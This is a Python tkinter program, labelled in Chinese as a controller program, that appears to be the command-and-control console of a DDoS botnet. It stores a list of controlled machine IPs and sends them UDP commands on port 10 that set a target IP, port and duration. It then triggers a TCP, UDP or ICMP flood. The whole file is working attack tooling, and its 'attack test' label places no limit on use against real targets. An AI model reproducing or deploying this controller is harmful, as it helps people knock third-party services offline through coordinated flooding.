import matplotlib,socket,threading,json,random
import os,time,struct
import tkinter as tk
import tkinter.ttk as ttk
from tkinter import *

global control

def attack_test_show():
    controlled_enter_button.place_forget()
    connect_controlled_test_button.place_forget()

    controlled_ip_label.place_forget()

    controlled_ip_entry.place_forget()

    controlled_ip_list.place_forget()
    list_frame.place_forget()
    scrollbar.place_forget()

    attack_button.place(relx=0.45, rely=0.8, relwidth=0.1, relheight=0.1)

    attack_ip_entry.place(x=200, y=100, width=200, height=50)
    attack_port_entry.place(x=200, y=200, width=200, height=50)
    attack_time_entry.place(x=200, y=300, width=200, height=50)
    
    attack_ip_label.place(x=40, y=100, width=200, height=50)
    attack_port_label.place(x=40, y=200, width=200, height=50)
    attack_time_label.place(x=40, y=300, width=200, height=50)
    attack_mode_label.place(x=500, y=100, width=200, height=50)

    attack_mode_combobox.place(x=700, y=100, width=200, height=50)

def connect_test_show():
    attack_button.place_forget()

    attack_ip_entry.place_forget()
    attack_port_entry.place_forget()
    attack_time_entry.place_forget()

    attack_ip_label.place_forget()
    attack_port_label.place_forget()
    attack_time_label.place_forget()
    attack_mode_label.place_forget()

    attack_mode_combobox.place_forget()

    controlled_enter_button.place(relx=0.2, rely=0.4, relwidth=0.1, relheight=0.1)
    connect_controlled_test_button.place(relx=0.45, rely=0.8, relwidth=0.1, relheight=0.1)

    controlled_ip_label.place(x =40,y =100,width=200,height=50)

    controlled_ip_entry.place(x =200,y =100,width=200,height=50)

    controlled_ip_list.pack(side=LEFT)
    list_frame.place(relx=0.5, rely=0.2,relwidth=0.4, relheight=0.4)
    scrollbar.place(in_=list_frame, relx=1.0, relheight=1.0, bordermode="outside")

def send_commands(code,parameter):
    controlled_ip = open('controlled_IP_list.txt','r',encoding='utf-8')
    for IPt in controlled_ip.readlines():
        if IPt == "\n":
            break
        else:
            try:
                control.sendto("連接成功".encode(),(IPt[:-1],10))
                print(F"{IPt[:-1]}連接成功")
            except Exception as ex:
                print(F'{IPt[:-1]}連接有誤\n{ex}')
    controlled_ip.close
    controlled_ip = open('controlled_IP_list.txt','r',encoding='utf-8')
    if code == "code00": ##更改攻擊IP
        for IPt in controlled_ip.readlines():
            control.sendto(F"code00{parameter}".encode(),(IPt[:-1],10))
            print(F"{IPt}傳送指令成功")
    elif code == "code01": ##更改攻擊時間
        for IPt in controlled_ip.readlines():
            control.sendto(F"code01{parameter}".encode(),(IPt[:-1],10))
            print(F"{IPt}傳送指令成功")
    elif code == "code02": ##發動ICMP攻擊
        for IPt in controlled_ip.readlines():
            control.sendto(F"code02{parameter}".encode(),(IPt[:-1],10))
            print(F"{IPt}傳送指令成功")
    elif code == "code03": ##更改攻擊PORT
        for IPt in controlled_ip.readlines():
            control.sendto(F"code03{parameter}".encode(),(IPt[:-1],10))
            print(F"{IPt}傳送指令成功")
    controlled_ip.close

def attack():
    attack_ip = attack_ip_entry.get()
    attack_port = attack_port_entry.get()
    attack_time = attack_time_entry.get()
    attack_mode =attack_mode_combobox.get()

    if attack_ip == "" or attack_port == "" or attack_time == "" or attack_mode == "":
        print("參數未齊全")
        return
    
    if str(attack_mode) == "ICMP flood":
        send_commands(code="code00", parameter=str(attack_ip))
        send_commands(code="code03", parameter=str(attack_port))
        send_commands(code="code01", parameter=str(attack_time))
        send_commands(code="code02", parameter="ICMP")
    elif str(attack_mode) == "TCP flood":
        send_commands(code="code00", parameter=str(attack_ip))
        send_commands(code="code03", parameter=str(attack_port))
        send_commands(code="code01", parameter=str(attack_time))
        send_commands(code="code02", parameter="TCP")
    elif str(attack_mode) == "UDP flood":
        send_commands(code="code00", parameter=str(attack_ip))
        send_commands(code="code03", parameter=str(attack_port))
        send_commands(code="code01", parameter=str(attack_time))
        send_commands(code="code02", parameter="UDP")

def controlled_ip_insert():
    controlled_ip = (controlled_ip_entry.get())
    file = open('controlled_IP_list.txt','r')
    for findip in file:
        if controlled_ip == findip[:-1]:
            print("已有存在的IP")
            return
    controlled_ip_list.insert(END, controlled_ip)
    file=open('controlled_IP_list.txt','a')
    file.writelines(F"{controlled_ip}\n")
    file.close

def delete_selected_item(x):
    selected_item = controlled_ip_list.curselection()
    x =controlled_ip_list.get(selected_item)
    controlled_ip_list.delete(selected_item)

    file = open('controlled_IP_list.txt','r')
    new_list = ""
    for findip in file:
        if str(findip[:-1]) != str(x):
            new_list += findip
    file.close
    file = open('controlled_IP_list.txt','w')
    file.write(new_list)
    file.close

def connect_test():
    global control
    with open("controlled_IP_list.txt", "w") as f:
        for item in controlled_ip_list.get(0, "end"):
            f.write(item + "\n")
    try:
        control = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except Exception as ex:
        print("連線有誤\n{ex}")
    controlled_ip= open('controlled_IP_list.txt','r',encoding='utf-8').readlines()
    for IPt in controlled_ip:
        if IPt == "\n":
            break
        else:
            try:
                control.sendto("連接成功".encode(),(IPt[:-1],10))
                print(F"{IPt[:-1]}連接成功")
            except Exception as ex:
                print(F'{IPt[:-1]}連接有誤\n{ex}')     

if __name__ == '__main__':

    filename = 'controlled_IP_list.txt'
    if os.path.isfile(filename):
        pass
    else:
        init_setting = open('controlled_IP_list.txt','w',encoding='utf-8')
        init_setting.write("")
        init_setting.close

    window = tk.Tk()
    window.title("控制端程式")
    window.minsize(width=1000, height=500)
    window.resizable(width=False, height=False)

    font_style_1 = ("Arial", 14, "bold")
    font_style_2 = ("Courier",20)
    attack_mode_list=["TCP flood", "UDP flood", "ICMP flood"]

    attack_test_button = tk.Button(text="攻擊測試", font=font_style_1, command=attack_test_show)
    connect_test_button = tk.Button(text="連線測試", font=font_style_1, command=connect_test_show)

    attack_button = tk.Button(text="攻擊", font=font_style_1, command=attack)

    controlled_enter_button = tk.Button(text="寫入", font=font_style_1, command=controlled_ip_insert)
    connect_controlled_test_button = tk.Button(text="確認連接", font=font_style_1, command=connect_test)
    
    attack_ip_label = tk.Label(window, text="攻擊對象IP", font=20)
    attack_port_label = tk.Label(window, text="輸入Port", font=20)
    attack_time_label = tk.Label(window, text="攻擊時間(分)", font=20)
    attack_mode_label = tk.Label(window, text="攻擊模式", font=20)

    controlled_ip_label = tk.Label(window, text="被控制IP", font=20)

    attack_mode_combobox = ttk.Combobox(window, values=attack_mode_list, font=font_style_2)

    attack_ip_entry = tk.Entry(window, font=font_style_2)
    attack_port_entry = tk.Entry(window, font=font_style_2)
    attack_time_entry = tk.Entry(window, font=font_style_2)

    controlled_ip_entry = tk.Entry(window, font=font_style_2)

    scrollbar = tk.Scrollbar(window)
    list_frame = tk.Frame(window)
    controlled_ip_list = tk.Listbox(list_frame, width=60, height=20, yscrollcommand=scrollbar.set, font=("Courier",20))
    scrollbar.config(command=controlled_ip_list.yview)
    controlled_ip_list.bind("<Double-Button-1>", lambda x: delete_selected_item(x))
    
    with open('controlled_IP_list.txt', 'r') as file:
        for line in file:
            controlled_ip_list.insert(END, line.strip())

    attack_test_button.place(relx=0, rely=0.001, relwidth=0.1, relheight=0.1)
    connect_test_button.place(relx=0.1, rely=0.001, relwidth=0.1, relheight=0.1)

    window.mainloop()